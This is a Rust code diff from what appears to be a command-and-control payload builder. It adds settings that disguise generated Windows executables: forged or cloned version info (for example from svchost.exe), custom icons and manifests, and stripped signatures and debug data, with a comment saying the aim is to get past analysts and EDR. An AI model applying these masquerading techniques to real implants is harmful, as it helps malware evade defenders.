@@ -52,6 +52,60 @@ pub struct PayloadConfig {
     /// Set to `"agent-standalone"` when building with `outbound-c`.
     #[serde(default)]
     pub bin_name: Option<String>,
+    // --- Artifact Kit (PE post-processing) fields ---
+    /// Version info resource to inject into the PE.  Only effective for
+    /// Windows PE targets; ignored on Linux/macOS.
+    #[serde(default)]
+    pub version_info: Option<VersionInfoConfig>,
+    /// Path to a `.ico` file whose icon should be embedded as RT_ICON /
+    /// RT_GROUP_ICON in the PE.  Only effective for Windows PE targets.
+    #[serde(default)]
+    pub icon_path: Option<String>,
+    /// Manifest preset: `"asInvoker"`, `"requireAdministrator"`, or
+    /// `"highestAvailable"`.  Only effective for Windows PE targets.
+    #[serde(default)]
+    pub manifest_preset: Option<String>,
+    /// Custom manifest XML string to inject as RT_MANIFEST.  Takes priority
+    /// over `manifest_preset` when both are set.  Only effective for Windows
+    /// PE targets.
+    #[serde(default)]
+    pub custom_manifest: Option<String>,
+    /// Remove any existing digital signature (IMAGE_DIRECTORY_ENTRY_SECURITY)
+    /// from the PE.  Default: true.  Only effective for Windows PE targets.
+    #[serde(default = "default_true")]
+    pub strip_signature: bool,
+    /// Remove the debug directory (IMAGE_DIRECTORY_ENTRY_DEBUG) from the PE,
+    /// which contains the PDB path.  Default: true.  Only effective for
+    /// Windows PE targets.
+    #[serde(default = "default_true")]
+    pub strip_debug: bool,
+}
+
+fn default_true() -> bool {
+    true
+}
+
+/// Version info to inject into the PE's .rsrc section (VS_VERSIONINFO).
+///
+/// This is the most critical artifact kit feature because version information
+/// is one of the first things analysts and EDR solutions check. A PE without
+/// version information is immediately suspicious.
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
+pub struct VersionInfoConfig {
+    pub file_version: Option<String>,
+    pub product_version: Option<String>,
+    pub file_description: Option<String>,
+    pub file_version_name: Option<String>,
+    pub original_filename: Option<String>,
+    pub product_name: Option<String>,
+    pub company_name: Option<String>,
+    pub legal_copyright: Option<String>,
+    pub comments: Option<String>,
+    /// Path to a reference PE to clone version info from (e.g.,
+    /// `C:\Windows\System32\svchost.exe`).  When set, the other fields are
+    /// ignored and version info is extracted from the reference PE instead.
+    #[serde(default)]
+    pub clone_from: Option<String>,
 }
 
 fn default_package() -> String {
@@ -223,6 +277,14 @@ pub fn cmd_configure(name: Option<String>) -> Result<()> {
         } else {
             None
         },
+        // Artifact kit defaults — operators can edit the profile TOML to
+        // configure version info, icons, manifests, etc.
+        version_info: None,
+        icon_path: None,
+        manifest_preset: None,
+        custom_manifest: None,
+        strip_signature: true,
+        strip_debug: true,
     };
 
     save_profile(&name, &profile)?;
@@ -325,6 +387,12 @@ mod tests {
             output_name: Some("test_agent".to_string()),
             package: "agent-standalone".to_string(),
             bin_name: Some("agent-standalone".to_string()),
+            version_info: None,
+            icon_path: None,
+            manifest_preset: None,
+            custom_manifest: None,
+            strip_signature: true,
+            strip_debug: true,
         };
         let s = toml::to_string(&profile).unwrap();
         let back: PayloadConfig = toml::from_str(&s).unwrap();
@@ -346,6 +414,12 @@ mod tests {
             output_name: None,
             package: "launcher".to_string(),
             bin_name: None,
+            version_info: None,
+            icon_path: None,
+            manifest_preset: None,
+            custom_manifest: None,
+            strip_signature: true,
+            strip_debug: true,
         };
         assert!(profile.encryption_key_bytes().is_err());
     }
@@ -380,6 +454,12 @@ package        = "launcher"
             output_name: None,
             package: "launcher".to_string(),
             bin_name: None,
+            version_info: None,
+            icon_path: None,
+            manifest_preset: None,
+            custom_manifest: None,
+            strip_signature: true,
+            strip_debug: true,
         };
         assert!(profile.target_triple().is_err());
     }
